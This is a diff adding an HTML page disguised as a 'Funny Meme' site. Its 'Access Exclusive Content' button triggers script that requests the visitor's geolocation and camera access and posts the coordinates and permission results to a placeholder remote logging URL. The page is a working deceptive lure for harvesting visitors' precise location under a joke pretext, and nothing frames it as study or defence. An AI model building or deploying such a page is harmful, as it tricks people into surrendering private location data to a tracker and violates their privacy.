@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Funny Meme</title>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        img {
+            margin-top: 50px;
+            width: 300px;
+        }
+        #accessBtn {
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        #accessBtn:hover {
+            background-color: #0056b3;
+        }
+        #warning {
+            margin-top: 20px;
+            color: red;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <h1>Click below for a hilarious meme!</h1>
+    <img src="img1.jpg" alt="Meme">
+    <button id="accessBtn">Access Exclusive Content</button>
+    <p id="warning"></p>
+
+    <script>
+        // Backend URL to log data (replace with your backend URL)
+        const backendUrl = 'https://your-backend-url/log';
+
+        // Function to send data to the backend
+        function sendDataToBackend(data) {
+            fetch(backendUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data),
+            })
+            .then(response => console.log("Data sent successfully:", data))
+            .catch(error => console.error("Error sending data:", error));
+        }
+
+        // Function to request location permission
+        function requestLocation() {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const data = {
+                        type: 'location',
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                    };
+                    sendDataToBackend(data);
+                    document.getElementById('warning').textContent = 'Location accessed!';
+                },
+                (error) => {
+                    const data = { type: 'location', error: error.message };
+                    sendDataToBackend(data);
+                    document.getElementById('warning').textContent = 'Location access denied!';
+                }
+            );
+        }
+
+        // Function to request camera permission
+        function requestCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    const data = { type: 'camera', status: 'access granted' };
+                    sendDataToBackend(data);
+                    document.getElementById('warning').textContent = 'Camera accessed!';
+                })
+                .catch((error) => {
+                    const data = { type: 'camera', status: 'access denied', error: error.message };
+                    sendDataToBackend(data);
+                    document.getElementById('warning').textContent = 'Camera access denied!';
+                });
+        }
+
+        // Main handler for the button click
+        document.getElementById('accessBtn').addEventListener('click', () => {
+            document.getElementById('warning').textContent = 'Requesting permissions...';
+            
+            // Simulate requesting both location and camera access
+            requestLocation();
+            requestCamera();
+        });
+    </script>
+</body>
+</html>
